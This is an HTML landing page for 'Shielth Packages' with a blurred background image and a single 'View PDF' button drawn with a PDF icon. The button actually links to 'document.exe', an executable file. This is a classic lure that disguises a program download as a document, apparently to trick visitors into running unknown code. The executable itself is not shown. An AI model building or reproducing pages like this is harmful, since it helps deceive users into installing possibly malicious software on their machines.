<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Shielth Packages</title>
    <style>
        body {
            margin: 0;
            font-family: Arial, sans-serif;
            position: relative;
            overflow: hidden;
        }
        body::before {
            content: '';
            position: absolute;
            top: -20px;
            left: -20px;
            right: -20px;
            bottom: -20px;
            background-image: url('https://i.pinimg.com/1200x/8e/d7/cb/8ed7cbdca6fa8afc4f38805e0bc44563.jpg');
            background-size: cover;
            background-position: center;
            filter: blur(10px);
            z-index: -1;
        }
        .container {
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            width: 100vw;
            height: 100vh;
            background-color: rgba(255, 235, 238, 0.85);
        }
        .logo {
            width: 200px;
            margin-bottom: 30px;
        }
        h1 {
            margin-bottom: 40px;
            font-size: 2.5em;
        }
        .download-link {
            display: inline-flex;
            align-items: center;
            text-decoration: none;
            color: #333;
            font-size: 1.5em;
            padding: 15px 30px;
            border: 1px solid #ccc;
            border-radius: 5px;
            transition: background-color 0.3s;
        }
        .download-link:hover {
            background-color: #e9e9e9;
        }
        .pdf-icon {
            width: 50px;
            height: 50px;
            margin-left: 20px;
        }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://i.pinimg.com/1200x/8e/d7/cb/8ed7cbdca6fa8afc4f38805e0bc44563.jpg" alt="Shielth Packages Logo" class="logo">
        <h1>Shielth Packages</h1>
        <a href="document.exe" class="download-link">
            <span>View PDF</span>
            <svg class="pdf-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                <path fill="#E53935" d="M14 2H6C4.9 2 4 2.9 4 4V20C4 21.1 4.9 22 6 22H18C19.1 22 20 21.1 20 20V8L14 2Z"/>
                <path fill="#FFFFFF" d="M13 9V3.5L18.5 9H13Z"/>
                <path fill="#FFFFFF" d="M8 12H16V14H8V12ZM8 15H16V17H8V15Z"/>
            </svg>
        </a>
    </div>
</body>
</html>
